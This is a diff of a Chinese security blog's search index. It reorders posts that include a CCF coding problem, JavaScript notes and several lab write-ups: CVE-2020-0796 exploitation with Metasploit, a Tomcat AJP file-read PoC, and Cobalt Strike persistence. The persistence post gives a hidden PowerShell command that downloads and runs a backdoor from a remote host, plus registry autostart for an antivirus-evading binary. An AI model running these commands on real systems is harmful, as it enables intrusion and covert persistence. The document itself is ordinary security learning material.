@@ -1,6 +1,16 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>asp、aspx、php、jsp万能密码大全</title>
+    <url>/2020/11/22/%20asp%E3%80%81aspx%E3%80%81php%E3%80%81jsp%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E5%A4%A7%E5%85%A8/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14018269.html">源地址：https://www.cnblogs.com/This-is-Y/p/14018269.html<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h1><h1 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h1><h1 id="PHP万能密码"><a href="#PHP万能密码" class="headerlink" title="PHP万能密码"></a>PHP万能密码</h1><h1 id><a href="#" class="headerlink" title></a></h1><p>  jsp</p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
     <title>.git  .svn  .ds_store  .hg  .idea  .swp    等网页文件泄露</title>
     <url>/2020/03/14/%20.git%20%20.svn%20%20.ds_store%20%20.hg%20%20.idea%20%20.swp%20%20%20%20%E7%AD%89%E7%BD%91%E9%A1%B5%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12492242.html">源地址：https://www.cnblogs.com/This-is-Y/p/12492242.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -27,16 +37,6 @@
 <p>文件利用：</p>
 <p>下载.swp文件到本地，使用vim -r filename.swp即可恢复文件内容</p>
 <p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>asp、aspx、php、jsp万能密码大全</title>
-    <url>/2020/11/22/%20asp%E3%80%81aspx%E3%80%81php%E3%80%81jsp%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E5%A4%A7%E5%85%A8/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14018269.html">源地址：https://www.cnblogs.com/This-is-Y/p/14018269.html<i class="fas fa-external-link-alt"></i></a></p>
-<h1 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h1><h1 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h1><h1 id="PHP万能密码"><a href="#PHP万能密码" class="headerlink" title="PHP万能密码"></a>PHP万能密码</h1><h1 id><a href="#" class="headerlink" title></a></h1><p>  jsp</p>
 ]]></content>
       <categories>
         <category>cnblogs</category>
@@ -414,6 +414,33 @@
       </categories>
   </entry>
   <entry>
+    <title>CCF 202006-1 线性分类器 python</title>
+    <url>/2020/08/14/CCF%20202006-1%20%E7%BA%BF%E6%80%A7%E5%88%86%E7%B1%BB%E5%99%A8%20python/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13502978.html">源地址：https://www.cnblogs.com/This-is-Y/p/13502978.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>题目：</p>
+<p>　　线性分类器（line）<br>　　【题目描述】<br>　　考虑一个简单的二分类问题——将二维平面上的点分为A和B两类。<br>　　训练数据包含n个点，其中第i个点（1≤i≤n）可以表示为一个三元组（x,y,type），即该点的横坐标、纵坐标和类别。<br>　　在二维平面上，任意一条直线可以表示为 θ₀+θ₁x+θ₂y=0的形式，即由θ₀，θ₁，θ₂三个参数确定该直线，且满足θ₀，θ₁不同时为0。<br>　　基于这n个已知类别的点，我们想要在平面上找到一条直线作为一个线性分类器。具体来说，这条线要把训练数据中的A、B两类点完美分隔开来，即一侧只有A类点、另一侧只有B类点。这样，对于任意一个的未知类别的点，我们就可以根据它是位于直线的哪一侧来预测它的类别了。<br>　　在本题中我们仅需要处理m个如下查询：给定一条直线，判断它是否能将训练数据中的A、B两类点完美分开。<br>【输入格式】<br>　　从标准输入读入数据。输入共n+m+1行。<br>　　第一行包含用空格分隔的两个正整数n和m，分别表示点和查询的个数。<br>　　第二行到第n+1行依次输入n个点的信息。第i+1行（1≤i≤n）包含用空格分隔的三项x,y和type，分别表示第i个点的横、纵坐标和类别，其中坐标为整数、类别为一个大写英文字母A或B。<br>　　第n+2行到第n+m+1行依次输入m个查询。第j+n+1行（1≤j≤m）包含用空格分隔的三个整数θ₀,θ₁和θ₂，表示第j个查询中给定直线的三个参数。</p>
+<p>【输出格式】<br>　　输出到标准输出。<br>　　输出共m行，每行输出一个字符串。<br>　　第j行（1≤j≤m）输出的字符串对应第个查询的结果：如果给定直线可以完美分隔A、B两类点，则输出Yes；否则输出No。<br>【样例1输入】</p>
+<p>9 3<br>1 1 A<br>1 0 A<br>1 -1 A<br>2 2 B<br>2 3 B<br>0 1 A<br>3 1 B<br>1 3 B<br>2 0 A<br>0 2 -3<br>-3 0 2<br>-3 1 1</p>
+<p>【样例1输出】</p>
+<p>No</p>
+<p>No</p>
+<p>Yes</p>
+<p> </p>
+<p>代码，用的python，从别人那里扒过来的。已获得同意   </p>
+<p>再补一个我自己写的</p>
+<p> </p>
+<p>满分</p>
+<img src="1503868-20200814163333221-1435192584.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CCF_2020_09 python</title>
     <url>/2020/09/16/CCF_2020_09%20python/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13681884.html">源地址：https://www.cnblogs.com/This-is-Y/p/13681884.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -502,26 +529,91 @@
       </categories>
   </entry>
   <entry>
-    <title>CCF 202006-1 线性分类器 python</title>
-    <url>/2020/08/14/CCF%20202006-1%20%E7%BA%BF%E6%80%A7%E5%88%86%E7%B1%BB%E5%99%A8%20python/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13502978.html">源地址：https://www.cnblogs.com/This-is-Y/p/13502978.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>题目：</p>
-<p>　　线性分类器（line）<br>　　【题目描述】<br>　　考虑一个简单的二分类问题——将二维平面上的点分为A和B两类。<br>　　训练数据包含n个点，其中第i个点（1≤i≤n）可以表示为一个三元组（x,y,type），即该点的横坐标、纵坐标和类别。<br>　　在二维平面上，任意一条直线可以表示为 θ₀+θ₁x+θ₂y=0的形式，即由θ₀，θ₁，θ₂三个参数确定该直线，且满足θ₀，θ₁不同时为0。<br>　　基于这n个已知类别的点，我们想要在平面上找到一条直线作为一个线性分类器。具体来说，这条线要把训练数据中的A、B两类点完美分隔开来，即一侧只有A类点、另一侧只有B类点。这样，对于任意一个的未知类别的点，我们就可以根据它是位于直线的哪一侧来预测它的类别了。<br>　　在本题中我们仅需要处理m个如下查询：给定一条直线，判断它是否能将训练数据中的A、B两类点完美分开。<br>【输入格式】<br>　　从标准输入读入数据。输入共n+m+1行。<br>　　第一行包含用空格分隔的两个正整数n和m，分别表示点和查询的个数。<br>　　第二行到第n+1行依次输入n个点的信息。第i+1行（1≤i≤n）包含用空格分隔的三项x,y和type，分别表示第i个点的横、纵坐标和类别，其中坐标为整数、类别为一个大写英文字母A或B。<br>　　第n+2行到第n+m+1行依次输入m个查询。第j+n+1行（1≤j≤m）包含用空格分隔的三个整数θ₀,θ₁和θ₂，表示第j个查询中给定直线的三个参数。</p>
-<p>【输出格式】<br>　　输出到标准输出。<br>　　输出共m行，每行输出一个字符串。<br>　　第j行（1≤j≤m）输出的字符串对应第个查询的结果：如果给定直线可以完美分隔A、B两类点，则输出Yes；否则输出No。<br>【样例1输入】</p>
-<p>9 3<br>1 1 A<br>1 0 A<br>1 -1 A<br>2 2 B<br>2 3 B<br>0 1 A<br>3 1 B<br>1 3 B<br>2 0 A<br>0 2 -3<br>-3 0 2<br>-3 1 1</p>
-<p>【样例1输出】</p>
-<p>No</p>
-<p>No</p>
-<p>Yes</p>
+    <title>CVE - 2020- 0796复现</title>
+    <url>/2020/06/20/CVE%20-%202020-%200796%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13166766.html">源地址：https://www.cnblogs.com/This-is-Y/p/13166766.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>复现过程参考：<a class="link" href="https://xz.aliyun.com/t/7440">https://xz.aliyun.com/t/7440<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" href="https://www.lstazl.com/cve-2020-0796%E5%BE%AE%E8%BD%AF-smbv3%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://www.lstazl.com/cve-2020-0796%E5%BE%AE%E8%BD%AF-smbv3%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/<i class="fas fa-external-link-alt"></i></a></p>
+<p>下载，安装win10虚拟机。受影响win10版本</p>
+<p>Windows 10 Version 1903 for 32-bit Systems<br><br>Windows 10 Version 1903 for x64-based Systems<br><br>Windows 10 Version 1903 for ARM64-based Systems<br><br>Windows Server, Version 1903 (Server Core installation)<br><br>Windows 10 Version 1909 for 32-bit Systems<br><br>Windows 10 Version 1909 for x64-based Systems<br><br>Windows 10 Version 1909 for ARM64-based Systems<br><br>Windows Server, Version 1909 (Server Core installation)<br><br>只影响 SMB v3.1.1，1903和1909</p>
 <p> </p>
-<p>代码，用的python，从别人那里扒过来的。已获得同意   </p>
-<p>再补一个我自己写的</p>
+<p>关闭自动更新，关闭防火墙</p>
+<p>ipconfig确认ip：<strong>192.168.229.131</strong></p>
+<img src="1503868-20200619152836656-226314013.png" alt loading="lazy">
+
 <p> </p>
-<p>满分</p>
-<img src="1503868-20200814163333221-1435192584.png" alt loading="lazy">
+<p> 下载漏洞检查工具，这里用的exe版本（<a class="link" href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">奇安信<i class="fas fa-external-link-alt"></i></a>）</p>
+<p>允许，检测，存在漏洞。</p>
+<img src="1503868-20200619152754960-879738139.png" alt loading="lazy">
+
+<p>在调整了一下后</p>
+<p>靶机win10：192.168.87.128</p>
+<p>攻击kali：192.168.87.130</p>
+<p>（因为物理机没法执行，所以转战虚拟机）</p>
+<br>
+蓝屏/提权poc  ：[**https://github.com/dacade/CVE-POC/tree/master/CVE-2020-0796**](https://github.com/dacade/CVE-POC/tree/master/CVE-2020-0796)
+
+<p>kali一个终端打开msf，</p>
+<p>use exploit/multi/handler</p>
+<p>set payload windows/x64/meterpreter/bind_tcp</p>
+<p>set lport 3333（POC默认为3333端口）</p>
+<p>set rhost 192.168.87.128</p>
+<p>run</p>
+<img src="1503868-20200620193059366-1301103579.png" alt loading="lazy">
+
+<p> 然后在那边执行POC</p>
+<p>python exploit.py 192.168.87.128</p>
+<img src="1503868-20200620203838299-500642625.png" alt loading="lazy">
+
+<p> 回到win10虚拟机，就可以看到蓝屏了。</p>
+<img src="1503868-20200620175556462-1719505833.png" width="800" loading="lazy">
+
+<p>然后隔壁老王告诉我，执行这个脚本，当目标靶机内存比较小（我这时候设置的4G）就会出现蓝屏，设置高一点（同时脸不要这么黑）</p>
+<p>之后调整了一下，把win10靶机设为8G内存，就成功拿到了shell</p>
+<img src="1503868-20200620203752320-455677403.png" alt loading="lazy">
+
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>CVE 2020 1938</title>
+    <url>/2020/06/26/CVE%202020%201938/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13194048.html">源地址：https://www.cnblogs.com/This-is-Y/p/13194048.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>漏洞简介</strong></p>
+<p><br>　　漏洞编号：cve-2020-1938</p>
+<p>　　cve-2020-1938是一个出现在Apache-Tomcat-Aip的文件包含漏洞，攻击者可以利用该漏洞读取包含Tomcat上所有的webapp目录下的任意文件写入：webapp配置文件或源代码。<br><br>　　由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。</p>
+<p>　　该漏洞只影响Windows平台，<strong>要求启用了CGIServlet和enableCmdLineArguments参数。</strong></p>
+<p><br><strong>漏洞影响范围</strong><br><br>　　Apache Tomcat 6<br><br>　　Apache Tomcat 7 &lt; 7.0.100<br><br>　　Apache Tomcat 8 &lt; 8.5.51<br><br>　　Apache Tomcat 9 &lt; 9.0.31</p>
+<p> </p>
+<p><strong>环境搭建</strong></p>
+<p>**　　**从<a class="link" href="https://archive.apache.org/dist/tomcat/%E4%B8%8B%E8%BD%BD%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E4%B8%8B%E7%9A%848.5.30">https://archive.apache.org/dist/tomcat/下载历史版本，这里我下的8.5.30<i class="fas fa-external-link-alt"></i></a></p>
+<p>　　<a class="link" href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.30/bin/">https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.30/bin/<i class="fas fa-external-link-alt"></i></a></p>
+<p>　　<img src="1503868-20200625105451210-1577079758.png" alt loading="lazy"></p>
+<p> </p>
+<p> 下载，解压，进入bin目录执行startup.bat文件，成功了差不多就是这个样子</p>
+<img src="1503868-20200625153216488-1832120573.png" width="900" loading="lazy">
 
 <p> </p>
 <p> </p>
+<p> 如果出现黑框闪一下就结束了的情况。可能是JAVA和JRE没找到，照<a class="link" href="https://blog.csdn.net/qq_31424825/article/details/102960742">这篇文章<i class="fas fa-external-link-alt"></i></a>或自己上网找办法解决一下</p>
+<p>运行后，浏览器访问<a class="link" href="http://localhost:8080/">http://localhost:8080/<i class="fas fa-external-link-alt"></i></a>   应该就可以看到这只扭曲到搞人心态的猫脸了</p>
+<p>真是不理解为什么会用这么扭曲的脸</p>
+<img src="1503868-20200625153552252-1512878631.png" width="900" loading="lazy">
+
+<p> </p>
+<p> </p>
+<p>可以用nmap查看端口打开情况，可以看到8009端口打开<br></p>
+<img src="1503868-20200625163202541-1435959186.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p> POC链接：<a class="link" href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi<i class="fas fa-external-link-alt"></i></a></p>
+<p>执行：python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 127.0.0.1 -p 8009 -f WEB-INF/web.xml（用python2执行）</p>
+<img src="1503868-20200625163313982-135638821.png" width="900" loading="lazy">
+
 <p> </p>
 ]]></content>
       <categories>
@@ -655,98 +747,6 @@
       </categories>
   </entry>
   <entry>
-    <title>CVE - 2020- 0796复现</title>
-    <url>/2020/06/20/CVE%20-%202020-%200796%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13166766.html">源地址：https://www.cnblogs.com/This-is-Y/p/13166766.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>复现过程参考：<a class="link" href="https://xz.aliyun.com/t/7440">https://xz.aliyun.com/t/7440<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link" href="https://www.lstazl.com/cve-2020-0796%E5%BE%AE%E8%BD%AF-smbv3%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://www.lstazl.com/cve-2020-0796%E5%BE%AE%E8%BD%AF-smbv3%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/<i class="fas fa-external-link-alt"></i></a></p>
-<p>下载，安装win10虚拟机。受影响win10版本</p>
-<p>Windows 10 Version 1903 for 32-bit Systems<br><br>Windows 10 Version 1903 for x64-based Systems<br><br>Windows 10 Version 1903 for ARM64-based Systems<br><br>Windows Server, Version 1903 (Server Core installation)<br><br>Windows 10 Version 1909 for 32-bit Systems<br><br>Windows 10 Version 1909 for x64-based Systems<br><br>Windows 10 Version 1909 for ARM64-based Systems<br><br>Windows Server, Version 1909 (Server Core installation)<br><br>只影响 SMB v3.1.1，1903和1909</p>
-<p> </p>
-<p>关闭自动更新，关闭防火墙</p>
-<p>ipconfig确认ip：<strong>192.168.229.131</strong></p>
-<img src="1503868-20200619152836656-226314013.png" alt loading="lazy">
-
-<p> </p>
-<p> 下载漏洞检查工具，这里用的exe版本（<a class="link" href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">奇安信<i class="fas fa-external-link-alt"></i></a>）</p>
-<p>允许，检测，存在漏洞。</p>
-<img src="1503868-20200619152754960-879738139.png" alt loading="lazy">
-
-<p>在调整了一下后</p>
-<p>靶机win10：192.168.87.128</p>
-<p>攻击kali：192.168.87.130</p>
-<p>（因为物理机没法执行，所以转战虚拟机）</p>
-<br>
-蓝屏/提权poc  ：[**https://github.com/dacade/CVE-POC/tree/master/CVE-2020-0796**](https://github.com/dacade/CVE-POC/tree/master/CVE-2020-0796)
-
-<p>kali一个终端打开msf，</p>
-<p>use exploit/multi/handler</p>
-<p>set payload windows/x64/meterpreter/bind_tcp</p>
-<p>set lport 3333（POC默认为3333端口）</p>
-<p>set rhost 192.168.87.128</p>
-<p>run</p>
-<img src="1503868-20200620193059366-1301103579.png" alt loading="lazy">
-
-<p> 然后在那边执行POC</p>
-<p>python exploit.py 192.168.87.128</p>
-<img src="1503868-20200620203838299-500642625.png" alt loading="lazy">
-
-<p> 回到win10虚拟机，就可以看到蓝屏了。</p>
-<img src="1503868-20200620175556462-1719505833.png" width="800" loading="lazy">
-
-<p>然后隔壁老王告诉我，执行这个脚本，当目标靶机内存比较小（我这时候设置的4G）就会出现蓝屏，设置高一点（同时脸不要这么黑）</p>
-<p>之后调整了一下，把win10靶机设为8G内存，就成功拿到了shell</p>
-<img src="1503868-20200620203752320-455677403.png" alt loading="lazy">
-
-<p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>CVE 2020 1938</title>
-    <url>/2020/06/26/CVE%202020%201938/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13194048.html">源地址：https://www.cnblogs.com/This-is-Y/p/13194048.html<i class="fas fa-external-link-alt"></i></a></p>
-<p><strong>漏洞简介</strong></p>
-<p><br>　　漏洞编号：cve-2020-1938</p>
-<p>　　cve-2020-1938是一个出现在Apache-Tomcat-Aip的文件包含漏洞，攻击者可以利用该漏洞读取包含Tomcat上所有的webapp目录下的任意文件写入：webapp配置文件或源代码。<br><br>　　由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。</p>
-<p>　　该漏洞只影响Windows平台，<strong>要求启用了CGIServlet和enableCmdLineArguments参数。</strong></p>
-<p><br><strong>漏洞影响范围</strong><br><br>　　Apache Tomcat 6<br><br>　　Apache Tomcat 7 &lt; 7.0.100<br><br>　　Apache Tomcat 8 &lt; 8.5.51<br><br>　　Apache Tomcat 9 &lt; 9.0.31</p>
-<p> </p>
-<p><strong>环境搭建</strong></p>
-<p>**　　**从<a class="link" href="https://archive.apache.org/dist/tomcat/%E4%B8%8B%E8%BD%BD%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E4%B8%8B%E7%9A%848.5.30">https://archive.apache.org/dist/tomcat/下载历史版本，这里我下的8.5.30<i class="fas fa-external-link-alt"></i></a></p>
-<p>　　<a class="link" href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.30/bin/">https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.30/bin/<i class="fas fa-external-link-alt"></i></a></p>
-<p>　　<img src="1503868-20200625105451210-1577079758.png" alt loading="lazy"></p>
-<p> </p>
-<p> 下载，解压，进入bin目录执行startup.bat文件，成功了差不多就是这个样子</p>
-<img src="1503868-20200625153216488-1832120573.png" width="900" loading="lazy">
-
-<p> </p>
-<p> </p>
-<p> 如果出现黑框闪一下就结束了的情况。可能是JAVA和JRE没找到，照<a class="link" href="https://blog.csdn.net/qq_31424825/article/details/102960742">这篇文章<i class="fas fa-external-link-alt"></i></a>或自己上网找办法解决一下</p>
-<p>运行后，浏览器访问<a class="link" href="http://localhost:8080/">http://localhost:8080/<i class="fas fa-external-link-alt"></i></a>   应该就可以看到这只扭曲到搞人心态的猫脸了</p>
-<p>真是不理解为什么会用这么扭曲的脸</p>
-<img src="1503868-20200625153552252-1512878631.png" width="900" loading="lazy">
-
-<p> </p>
-<p> </p>
-<p>可以用nmap查看端口打开情况，可以看到8009端口打开<br></p>
-<img src="1503868-20200625163202541-1435959186.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-<p> POC链接：<a class="link" href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi<i class="fas fa-external-link-alt"></i></a></p>
-<p>执行：python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 127.0.0.1 -p 8009 -f WEB-INF/web.xml（用python2执行）</p>
-<img src="1503868-20200625163313982-135638821.png" width="900" loading="lazy">
-
-<p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
     <title>CVE-2019-0708</title>
     <url>/2020/06/21/CVE-2019-0708/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13172491.html">源地址：https://www.cnblogs.com/This-is-Y/p/13172491.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -836,54 +836,6 @@
 <p> </p>
 <p> </p>
 <p>　</p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Cobalt Strike权限维持</title>
-    <url>/2020/10/03/Cobalt%20Strike%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13763667.html">源地址：https://www.cnblogs.com/This-is-Y/p/13763667.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>比较菜，目前需要上线的目标是system权限</p>
-<p>1、sc创建自启动服务</p>
-<p>以下命令都是在cs中执行的，在cmd中测试只需要删掉前面的shell就行</p>
-<p>先创建一个服务（需要system权限）</p>
-<p>shell sc create “shell” binpath= “cmd /c start powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(‘<a class="link" href="http://192.168.123.54/%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6&#39;))\&quot;&quot;">http://192.168.123.54/后门文件&#39;))\&quot;&quot;<i class="fas fa-external-link-alt"></i></a></p>
-<img src="1503868-20201003101057792-1730825120.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-<p> 因为是拿自己的电脑测试的，直接用win+r启动services.msc来查看服务状态确认一下，此时还是手动的。</p>
-<img src="1503868-20201003101330081-319574120.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-<p> 设置自启动</p>
-<p>shell sc config “shell” start= auto</p>
-<p>设置描述</p>
-<p>shell sc description “shell” “shell persistence”</p>
-<p>启动服务</p>
-<p>shell net start “shell”</p>
-<p>删除服务</p>
-<p>shell sc delete “shell”</p>
-<p> </p>
-<p>如果没有公网IP，也可以上传一个免杀后门到目标上，也是使用sc配置一个自启动服务来进行权限维持　　</p>
-<p>sc create “shell_local” binpath= “C:\Users\Public\BypassAV.exe（文件路径）”</p>
-<p>sc description “shell_local” “shell_local_persistence”</p>
-<p>sc config “shell_local” start= auto</p>
-<p>net start “shell_local”</p>
-<p> </p>
-<p>2、注册表自启动</p>
-<p>同样需要先需要上传一个免杀后门</p>
-<p>命令shell reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v “shell_regedit” /t REG_SZ /d “C:\Users\Public\BypassAV.exe（文件路径）” /f</p>
-<p>要删除也简单shell reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v “shell_regedit”</p>
-<img src="1503868-20201003104333155-300830107.png" alt loading="lazy">
-
-<p> 当然、也可以采用插件</p>
-<p><a class="link" href="https://github.com/ZonkSec/persistence-aggressor-script">https://github.com/ZonkSec/persistence-aggressor-script<i class="fas fa-external-link-alt"></i></a></p>
-<p><br> </p>
-<p> </p>
 ]]></content>
       <categories>
         <category>cnblogs</category>
@@ -1133,6 +1085,54 @@
       </categories>
   </entry>
   <entry>
+    <title>Cobalt Strike权限维持</title>
+    <url>/2020/10/03/Cobalt%20Strike%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13763667.html">源地址：https://www.cnblogs.com/This-is-Y/p/13763667.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>比较菜，目前需要上线的目标是system权限</p>
+<p>1、sc创建自启动服务</p>
+<p>以下命令都是在cs中执行的，在cmd中测试只需要删掉前面的shell就行</p>
+<p>先创建一个服务（需要system权限）</p>
+<p>shell sc create “shell” binpath= “cmd /c start powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(‘<a class="link" href="http://192.168.123.54/%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6&#39;))\&quot;&quot;">http://192.168.123.54/后门文件&#39;))\&quot;&quot;<i class="fas fa-external-link-alt"></i></a></p>
+<img src="1503868-20201003101057792-1730825120.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p> 因为是拿自己的电脑测试的，直接用win+r启动services.msc来查看服务状态确认一下，此时还是手动的。</p>
+<img src="1503868-20201003101330081-319574120.png" alt loading="lazy">
+
+<p> </p>
+<p> </p>
+<p> 设置自启动</p>
+<p>shell sc config “shell” start= auto</p>
+<p>设置描述</p>
+<p>shell sc description “shell” “shell persistence”</p>
+<p>启动服务</p>
+<p>shell net start “shell”</p>
+<p>删除服务</p>
+<p>shell sc delete “shell”</p>
+<p> </p>
+<p>如果没有公网IP，也可以上传一个免杀后门到目标上，也是使用sc配置一个自启动服务来进行权限维持　　</p>
+<p>sc create “shell_local” binpath= “C:\Users\Public\BypassAV.exe（文件路径）”</p>
+<p>sc description “shell_local” “shell_local_persistence”</p>
+<p>sc config “shell_local” start= auto</p>
+<p>net start “shell_local”</p>
+<p> </p>
+<p>2、注册表自启动</p>
+<p>同样需要先需要上传一个免杀后门</p>
+<p>命令shell reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v “shell_regedit” /t REG_SZ /d “C:\Users\Public\BypassAV.exe（文件路径）” /f</p>
+<p>要删除也简单shell reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v “shell_regedit”</p>
+<img src="1503868-20201003104333155-300830107.png" alt loading="lazy">
+
+<p> 当然、也可以采用插件</p>
+<p><a class="link" href="https://github.com/ZonkSec/persistence-aggressor-script">https://github.com/ZonkSec/persistence-aggressor-script<i class="fas fa-external-link-alt"></i></a></p>
+<p><br> </p>
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
     <title>DC-4靶机</title>
     <url>/2020/07/22/DC-4%E9%9D%B6%E6%9C%BA/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13347213.html">源地址：https://www.cnblogs.com/This-is-Y/p/13347213.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -1267,111 +1267,6 @@
 <p> </p>
 <p> </p>
 <p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>JS学习中的细节</title>
-    <url>/2020/01/19/JS%E5%AD%A6%E4%B9%A0%E4%B8%AD%E7%9A%84%E7%BB%86%E8%8A%82/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12215067.html">源地址：https://www.cnblogs.com/This-is-Y/p/12215067.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>————恢复内容开始————</p>
-<p>输出</p>
-<ul>
-<li>document.getElementById(“id_name”).innerHTML=”输出内容”;</li>
-</ul>
-<p>　　这种是通过找到该id得元素进行修改，达到输出的目的。</p>
-<ul>
-<li>document.write(“html代码”);</li>
-</ul>
-<p>　　从内容就可以知道这是直接写一段html代码到当前html文档中</p>
-<ul>
-<li>console.log(“内容”);</li>
-</ul>
-<p>　　这是输出到浏览器控制台，前端不可见。按F12到console查看，代码出错的时候，还会有报错信息。</p>
-<p>大小写</p>
-<ul>
-<li>js对大小写严格，getELementById和GETelementbyid是不一样的（写成后面这样子前端不会报错，但是代码不会工作，控制台里会给错误信息）。同样，变量名也如此</li>
-</ul>
-<p>字符串拼接</p>
-<li>字符串用单引号或者双引号包起来，可以使用加号拼接，当字符串与数字用加号拼接时，数字作为字符串处理
-
-<pre>var a = 1;
-var b = 3;
-var t1 = "python ";
-var t2 = "is ";
-var t3 = "best ";
-document.getElementById("t2").innerHTML=a+b;    //4
